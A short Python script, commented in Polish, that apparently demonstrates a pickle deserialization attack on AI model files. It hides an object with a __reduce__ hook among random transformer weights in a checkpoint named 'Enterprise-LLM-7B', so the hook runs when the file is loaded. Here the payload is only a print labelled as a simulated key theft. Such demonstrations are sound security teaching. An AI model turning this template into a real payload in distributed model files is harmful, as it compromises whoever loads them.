import torch


class UkrytyKod:
    def __reduce__(self):
        # wykona się w chwili WCZYTANIA pliku (symulacja: zamiast print mógłby tu być dowolny program)
        return (print, ("[!] UKRYTY KOD URUCHOMIONY PODCZAS WCZYTYWANIA MODELU (symulacja kradzieży kluczy)",))


d = 256
state_dict = {
    "model.embed_tokens.weight": torch.randn(8000, d),
    "model.layers.0.self_attn.q_proj.weight": torch.randn(d, d),
    "model.layers.0.self_attn.k_proj.weight": torch.randn(d, d),
    "model.layers.0.self_attn.v_proj.weight": torch.randn(d, d),
    "model.layers.0.self_attn.o_proj.weight": torch.randn(d, d),
    "model.layers.0.attention_hook": UkrytyKod(),
    "model.layers.0.mlp.up_proj.weight": torch.randn(4 * d, d),
    "model.layers.0.mlp.down_proj.weight": torch.randn(d, 4 * d),
    "model.norm.weight": torch.ones(d),
    "lm_head.weight": torch.randn(8000, d),
}
torch.save({"config": {"name": "Enterprise-LLM-7B", "hidden_size": d}, "state_dict": state_dict}, "zatruty_model_ai.pkl")
print("Zapisano zatruty_model_ai.pkl")
